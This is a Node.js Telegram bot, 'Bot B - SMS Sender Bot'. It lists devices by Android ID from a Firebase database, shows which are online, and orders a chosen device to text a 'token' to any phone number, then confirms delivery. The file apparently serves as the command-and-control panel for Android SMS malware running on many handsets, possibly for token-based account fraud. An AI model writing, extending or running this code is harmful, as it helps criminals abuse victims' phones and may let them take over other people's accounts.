require('dotenv').config();

/**
 * Bot B - SMS Sender Bot
 * Simple password protection, dynamic pagination, SMS sending
 */

const { Telegraf, Markup } = require('telegraf');
const EventSource = require('eventsource');
const fs = require('fs');
const path = require('path');

// ============================================
// CONFIGURATION
// ============================================

const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const DATABASE_URL = process.env.DATABASE_URL || 'YOUR_FIREBASE_URL_HERE';
const BOT_PASSWORD = process.env.BOT_PASSWORD || '1234';

// Constants
const DEVICES_PER_PAGE = 10;
const DATA_FILE = path.join(__dirname, 'bot_config.json');

// ============================================
// STATE MANAGEMENT
// ============================================

let deviceList = [];
let deviceStatus = {};
let totalDevices = 0;
const userSessions = new Map();
const authenticatedUsers = new Set();

// ============================================
// HELPER FUNCTIONS
// ============================================

function loadConfig() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
  } catch (e) {
    console.log('No config file found');
  }
  return {};
}

function timeAgo(timestamp) {
  if (!timestamp) return 'Unknown';
  const seconds = Math.floor((Date.now() - timestamp) / 1000);
  if (seconds < 60) return `${seconds} sec ago`;
  if (seconds < 3600) return `${Math.floor(seconds / 60)} min ago`;
  if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours ago`;
  return `${Math.floor(seconds / 86400)} days ago`;
}

function getStatusEmoji(lastSeen) {
  if (!lastSeen) return '⚫';
  const minutesAgo = (Date.now() - lastSeen) / 60000;
  if (minutesAgo < 2) return '🟢';
  if (minutesAgo < 10) return '🟡';
  return '🔴';
}

async function fetchDevices() {
  try {
    const response = await fetch(`${DATABASE_URL}/.json?shallow=true`);
    const data = await response.json();
    if (!data) return [];
    const devices = Object.keys(data).filter(key => {
      if (['All_Users', 'clients', 'all_pas', 'Admin'].includes(key)) return false;
      return /^[a-zA-Z0-9]{10,20}$/.test(key);
    });
    return devices;
  } catch (error) {
    console.error('Error fetching devices:', error);
    return [];
  }
}

async function fetchDeviceStatus(deviceId) {
  try {
    const response = await fetch(`${DATABASE_URL}/${deviceId}/webhookEvent/sendSms.json`);
    const data = await response.json();
    if (data) {
      const entries = Object.values(data);
      const latest = entries.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))[0];
      return {
        lastSeen: latest?.timestamp || null,
        totalSms: entries.length
      };
    }
    return { lastSeen: null, totalSms: 0 };
  } catch (error) {
    return { lastSeen: null, totalSms: 0 };
  }
}

function generatePagination(total, perPage = DEVICES_PER_PAGE) {
  const totalPages = Math.ceil(total / perPage);
  const buttons = [];
  for (let page = 1; page <= totalPages; page++) {
    const start = ((page - 1) * perPage) + 1;
    const end = Math.min(page * perPage, total);
    buttons.push(Markup.button.callback(`${start}-${end}`, `page_${page}`));
  }
  const rows = [];
  for (let i = 0; i < buttons.length; i += 5) {
    rows.push(buttons.slice(i, i + 5));
  }
  return { totalPages, rows, perPage };
}

function parseInput(input) {
  const parts = input.split('|').map(p => p.trim());
  if (parts.length !== 2) return null;
  const phone = parts[0].replace(/\D/g, '');
  const token = parts[1];
  if (phone.length < 10) return null;
  if (token.length < 10) return null;
  return { phone, token };
}

async function sendSmsCommand(deviceId, phone, message) {
  const path = `${DATABASE_URL}/${deviceId}/action/sendSms.json`;
  const data = {
    message: message,
    to: phone,
    status: 'pending',
    timestamp: Date.now()
  };
  const response = await fetch(path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  return response.ok;
}

async function checkSmsSent(deviceId, phone, message) {
  try {
    const response = await fetch(`${DATABASE_URL}/${deviceId}/webhookEvent/sendSms.json`);
    const data = await response.json();
    if (!data) return false;
    const entries = Object.values(data);
    const sent = entries.find(entry => 
      entry.to === phone && 
      entry.message === message && 
      entry.isSended === 'true'
    );
    return !!sent;
  } catch (error) {
    return false;
  }
}

// ============================================
// PASSWORD MIDDLEWARE
// ============================================

const checkPassword = async (ctx, next) => {
  const chatId = ctx.chat.id;
  if (authenticatedUsers.has(chatId)) {
    return next();
  }
  const session = userSessions.get(chatId);
  if (session?.step === 'enter_password') {
    return next();
  }
  userSessions.set(chatId, { step: 'enter_password' });
  await ctx.reply(
    '🔐 *Bot Protected*\\n\\n' +
    'Please enter password to continue:\\n' +
    '(One-time entry, will not ask again)',
    { parse_mode: 'Markdown' }
  );
};

// ============================================
// BOT SETUP
// ============================================

const bot = new Telegraf(BOT_TOKEN);

bot.use(async (ctx, next) => {
  if (ctx.message?.text === '/start') {
    return next();
  }
  return checkPassword(ctx, next);
});

// ============================================
// COMMANDS
// ============================================

bot.command('start', async (ctx) => {
  const chatId = ctx.chat.id;
  if (authenticatedUsers.has(chatId)) {
    return showDeviceList(ctx, 1);
  }
  userSessions.set(chatId, { step: 'enter_password' });
  await ctx.reply(
    '👋 *Welcome to SMS Sender Bot (Bot B)*\\n\\n' +
    '🔐 This bot is password protected.\\n\\n' +
    'Please enter password to continue:',
    { parse_mode: 'Markdown' }
  );
});

bot.command('help', (ctx) => {
  ctx.reply(
    '*SMS Sender Bot - Help*\\n\n' +
    '*Commands:*\\n' +
    '/start - Start the bot\\n' +
    '/send - Send new SMS\\n' +
    '/devices - List all devices\\n' +
    '/status - Check device status\\n' +
    '/logout - Clear session\\n\n' +
    '*How to send SMS:*\\n' +
    '1. Enter password (one-time)\\n' +
    '2. Select a device (🟢 = online)\\n' +
    '3. Enter: NUMBER | TOKEN\\n' +
    '4. Wait for confirmation\\n\n' +
    '*Format:* 9876543210 | v+H3QvA66Qcq...',
    { parse_mode: 'Markdown' }
  );
});

bot.command('logout', (ctx) => {
  const chatId = ctx.chat.id;
  authenticatedUsers.delete(chatId);
  userSessions.delete(chatId);
  ctx.reply('✅ Logged out. Use /start to login again.');
});

// ============================================
// PASSWORD HANDLER
// ============================================

bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const session = userSessions.get(chatId);
  
  if (session?.step === 'enter_password') {
    if (text === BOT_PASSWORD) {
      authenticatedUsers.add(chatId);
      userSessions.delete(chatId);
      await ctx.reply('✅ *Access Granted!*\\n\\nWelcome to SMS Sender Bot.', {
        parse_mode: 'Markdown'
      });
      return showDeviceList(ctx, 1);
    } else {
      return ctx.reply('❌ Wrong password! Try again:');
    }
  }
  
  await handleTextInput(ctx, text);
});

// ============================================
// DEVICE LIST DISPLAY
// ============================================

async function showDeviceList(ctx, page, filter = 'all') {
  try {
    if (deviceList.length === 0) {
      deviceList = await fetchDevices();
      totalDevices = deviceList.length;
      for (const deviceId of deviceList) {
        const status = await fetchDeviceStatus(deviceId);
        deviceStatus[deviceId] = {
          lastSeen: status.lastSeen,
          totalSms: status.totalSms
        };
      }
    }
    
    let filteredDevices = deviceList;
    if (filter === 'online') {
      filteredDevices = deviceList.filter(id => {
        const lastSeen = deviceStatus[id]?.lastSeen;
        return lastSeen && (Date.now() - lastSeen) < 600000;
      });
    } else if (filter === 'offline') {
      filteredDevices = deviceList.filter(id => {
        const lastSeen = deviceStatus[id]?.lastSeen;
        return !lastSeen || (Date.now() - lastSeen) >= 600000;
      });
    }
    
    filteredDevices.sort((a, b) => {
      const statusA = deviceStatus[a]?.lastSeen || 0;
      const statusB = deviceStatus[b]?.lastSeen || 0;
      return statusB - statusA;
    });
    
    const total = filteredDevices.length;
    const perPage = DEVICES_PER_PAGE;
    const start = (page - 1) * perPage;
    const end = Math.min(start + perPage, total);
    const pageDevices = filteredDevices.slice(start, end);
    
    const onlineCount = deviceList.filter(id => {
      const lastSeen = deviceStatus[id]?.lastSeen;
      return lastSeen && (Date.now() - lastSeen) < 600000;
    }).length;
    const offlineCount = deviceList.length - onlineCount;
    
    let message = '📱 *SMS Sender Bot*\\n\\n';
    message += `🟢 Online: ${onlineCount} | 🔴 Offline: ${offlineCount} | Total: ${deviceList.length}\\n\\n`;
    
    if (filter !== 'all') {
      message += `Filter: ${filter === 'online' ? '🟢 Online Only' : '🔴 Offline Only'}\\n`;
      message += `Showing: ${total} devices\\n\\n`;
    }
    
    const pagination = generatePagination(total, perPage);
    const deviceButtons = [];
    
    pageDevices.forEach((deviceId, index) => {
      const globalIndex = start + index + 1;
      const lastSeen = deviceStatus[deviceId]?.lastSeen;
      const emoji = getStatusEmoji(lastSeen);
      const time = timeAgo(lastSeen);
      const shortId = deviceId.length > 12 ? deviceId.substring(0, 12) + '...' : deviceId;
      
      message += `${globalIndex}. ${emoji} \`${shortId}\`\\n`;
      message += `   ${time} | SMS: ${deviceStatus[deviceId]?.totalSms || 0}\\n\\n`;
      
      deviceButtons.push([Markup.button.callback(`${globalIndex}. ${emoji} Select`, `select_${deviceId}`)]);
    });
    
    message += `\\nPage ${page}/${pagination.totalPages} | Showing ${start + 1}-${end} of ${total}`;
    
    const navButtons = [];
    if (page > 1) navButtons.push(Markup.button.callback('⬅️ Previous', `page_${page - 1}`));
    navButtons.push(Markup.button.callback(`📄 ${page}/${pagination.totalPages}`, 'current_page'));
    if (end < total) navButtons.push(Markup.button.callback('➡️ Next', `page_${page + 1}`));
    
    const filterButtons = [
      Markup.button.callback('🔍 Search', 'search_device'),
      Markup.button.callback('🟢 Online', 'filter_online'),
      Markup.button.callback('🔴 Offline', 'filter_offline'),
      Markup.button.callback('🔃 Refresh', 'refresh_list')
    ];
    
    const keyboard = [
      ...pagination.rows.slice(0, 2),
      navButtons,
      filterButtons
    ];
    
    keyboard.push(...deviceButtons.slice(0, 10));
    
    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard(keyboard)
    });
    
  } catch (error) {
    console.error('Error showing device list:', error);
    ctx.reply('❌ Error loading devices. Try /start again.');
  }
}

// ============================================
// TEXT INPUT HANDLER
// ============================================

async function handleTextInput(ctx, text) {
  const chatId = ctx.chat.id;
  const session = userSessions.get(chatId);
  
  if (!session) {
    return ctx.reply('Use /start to begin.');
  }
  
  if (session.step === 'search') {
    const query = text.toLowerCase();
    const matches = deviceList.filter(id => id.toLowerCase().includes(query));
    
    if (matches.length === 0) {
      return ctx.reply('❌ No devices found. Try again.');
    }
    
    let message = `🔍 *Search Results* (${matches.length} found):\\n\\n`;
    
    matches.slice(0, 20).forEach((deviceId, index) => {
      const lastSeen = deviceStatus[deviceId]?.lastSeen;
      const emoji = getStatusEmoji(lastSeen);
      const time = timeAgo(lastSeen);
      
      message += `${index + 1}. ${emoji} \`${deviceId}\`\\n`;
      message += `   ${time}\\n\\n`;
    });
    
    const buttons = matches.slice(0, 10).map((deviceId, index) => [
      Markup.button.callback(`${index + 1}. Select ${deviceId.substring(0, 8)}...`, `select_${deviceId}`)
    ]);
    
    buttons.push([Markup.button.callback('🔙 Back to List', 'refresh_list')]);
    
    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard(buttons)
    });
    
    userSessions.delete(chatId);
    return;
  }
  
  if (session.step === 'enter_details') {
    const parsed = parseInput(text);
    
    if (!parsed) {
      return ctx.reply(
        '❌ Invalid format!\\n\\n' +
        'Use: NUMBER | TOKEN\\n' +
        'Example: `9876543210 | v+H3QvA66Qcq...`',
        { parse_mode: 'Markdown' }
      );
    }
    
    const { phone, token } = parsed;
    const { deviceId, isOnline } = session;
    
    session.step = 'confirm';
    session.phone = phone;
    session.token = token;
    
    let message = `📋 *Confirm SMS Details*\\n\\n`;
    message += `📱 Device: \`${deviceId}\`\\n`;
    message += `📞 To: ${phone}\\n`;
    message += `🔑 Token: ${token.substring(0, 30)}...\\n\\n`;
    
    if (!isOnline) {
      message += `⚠️ Device is offline. SMS will be queued.\\n\\n`;
    }
    
    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('✅ Confirm & Send', `confirm_send_${deviceId}`)],
        [Markup.button.callback('❌ Cancel', 'cancel_send')]
      ])
    });
    
    return;
  }
}

// ============================================
// ACTION HANDLERS
// ============================================

bot.action(/page_(\d+)/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  await ctx.answerCbQuery(`Page ${page}`);
  await showDeviceList(ctx, page);
});

bot.action('filter_online', async (ctx) => {
  await ctx.answerCbQuery('Showing online devices');
  await showDeviceList(ctx, 1, 'online');
});

bot.action('filter_offline', async (ctx) => {
  await ctx.answerCbQuery('Showing offline devices');
  await showDeviceList(ctx, 1, 'offline');
});

bot.action('refresh_list', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  deviceList = [];
  await showDeviceList(ctx, 1);
});

bot.action('search_device', async (ctx) => {
  await ctx.answerCbQuery('Search mode');
  const chatId = ctx.chat.id;
  userSessions.set(chatId, { step: 'search' });
  await ctx.reply(
    '🔍 *Search Device*\\n\\n' +
    'Enter part of Android ID:',
    { parse_mode: 'Markdown' }
  );
});

bot.action(/select_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  const chatId = ctx.chat.id;
  
  const lastSeen = deviceStatus[deviceId]?.lastSeen;
  const emoji = getStatusEmoji(lastSeen);
  const time = timeAgo(lastSeen);
  const isOnline = emoji === '🟢';
  
  userSessions.set(chatId, {
    step: 'enter_details',
    deviceId: deviceId,
    isOnline: isOnline
  });
  
  let message = `📱 *Selected Device*\\n\\n`;
  message += `ID: \`${deviceId}\`\\n`;
  message += `Status: ${emoji} ${isOnline ? 'ONLINE' : 'OFFLINE'}\\n`;
  message += `Last seen: ${time}\\n`;
  message += `Total SMS: ${deviceStatus[deviceId]?.totalSms || 0}\\n\\n`;
  
  if (!isOnline) {
    message += `⚠️ *Warning: Device is offline*\\n`;
    message += `SMS will be queued and sent when online.\\n\\n`;
  }
  
  message += `✏️ *Enter recipient details:*\\n\\n`;
  message += `Format: NUMBER | TOKEN\\n`;
  message += `Example: \`9876543210 | v+H3QvA66Qcq...\``;
  
  await ctx.answerCbQuery('Device selected');
  await ctx.reply(message, { parse_mode: 'Markdown' });
});

bot.action(/confirm_send_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  const chatId = ctx.chat.id;
  const session = userSessions.get(chatId);
  
  if (!session || !session.phone || !session.token) {
    return ctx.answerCbQuery('Session expired. Start again.');
  }
  
  const { phone, token } = session;
  
  await ctx.answerCbQuery('Sending...');
  
  const statusMsg = await ctx.reply('🔄 *Sending SMS...*\\n\\nStep 1: Writing to Firebase...', {
    parse_mode: 'Markdown'
  });
  
  try {
    const sent = await sendSmsCommand(deviceId, phone, token);
    
    if (!sent) {
      throw new Error('Failed to write to Firebase');
    }
    
    await ctx.telegram.editMessageText(
      chatId, statusMsg.message_id, null,
      '🔄 *Sending SMS...*\\n\\n' +
      '✅ Step 1: Command written\\n' +
      '⏳ Step 2: Waiting for device...',
      { parse_mode: 'Markdown' }
    );
    
    let confirmed = false;
    let attempts = 0;
    const maxAttempts = 15;
    
    while (!confirmed && attempts < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      confirmed = await checkSmsSent(deviceId, phone, token);
      attempts++;
      
      if (attempts % 3 === 0) {
        await ctx.telegram.editMessageText(
          chatId, statusMsg.message_id, null,
          '🔄 *Sending SMS...*\\n\\n' +
          '✅ Step 1: Command written\\n' +
          `⏳ Step 2: Waiting for device... (${attempts}s)`,
          { parse_mode: 'Markdown' }
        );
      }
    }
    
    if (confirmed) {
      await ctx.telegram.editMessageText(
        chatId, statusMsg.message_id, null,
        '✅ *SMS SENT SUCCESSFULLY!*\\n\\n' +
        `📱 Device: \`${deviceId}\`\\n` +
        `📞 To: ${phone}\\n` +
        `🔑 Token: ${token.substring(0, 30)}...\\n` +
        `⏱️ Time: ${attempts} seconds\\n` +
        `📊 Status: ✅ Confirmed Delivered`,
        { 
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('🔄 Send Another', 'refresh_list')],
            [Markup.button.callback('🏠 Main Menu', 'start')]
          ])
        }
      );
    } else {
      await ctx.telegram.editMessageText(
        chatId, statusMsg.message_id, null,
        '⏳ *SMS QUEUED*\\n\\n' +
        `📱 Device: \`${deviceId}\`\\n` +
        `📞 To: ${phone}\\n` +
        `🔑 Token: ${token.substring(0, 30)}...\\n\\n` +
        `✅ Command sent to device\\n` +
        `⏳ Waiting for confirmation...\\n` +
        `Device may be processing or offline.`,
        { 
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('🔄 Check Status', `check_status_${deviceId}`)],
            [Markup.button.callback('📱 Send Another', 'refresh_list')]
          ])
        }
      );
    }
    
  } catch (error) {
    console.error('Send error:', error);
    await ctx.telegram.editMessageText(
      chatId, statusMsg.message_id, null,
      '❌ *FAILED TO SEND*\\n\\n' +
      `Error: ${error.message}`,
      { parse_mode: 'Markdown' }
    );
  }
  
  userSessions.delete(chatId);
});

bot.action('cancel_send', async (ctx) => {
  userSessions.delete(ctx.chat.id);
  await ctx.answerCbQuery('Cancelled');
  await ctx.reply('❌ Cancelled. Use /start to begin.');
});

bot.action(/check_status_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  await ctx.answerCbQuery('Checking...');
  
  const status = await fetchDeviceStatus(deviceId);
  deviceStatus[deviceId] = status;
  
  const lastSeen = status.lastSeen;
  const emoji = getStatusEmoji(lastSeen);
  const time = timeAgo(lastSeen);
  
  await ctx.reply(
    `📱 *Device Status*\\n\\n` +
    `ID: \`${deviceId}\`\\n` +
    `Status: ${emoji} ${emoji === '🟢' ? 'ONLINE' : 'OFFLINE'}\\n` +
    `Last seen: ${time}\\n` +
    `Total SMS: ${status.totalSms}`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('start', async (ctx) => {
  await ctx.answerCbQuery('Starting...');
  await showDeviceList(ctx, 1);
});

bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('❌ Error occurred. Try /start again.').catch(() => {});
});

console.log('Starting Bot B with password protection...');
bot.launch();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

console.log('Bot B is running!');
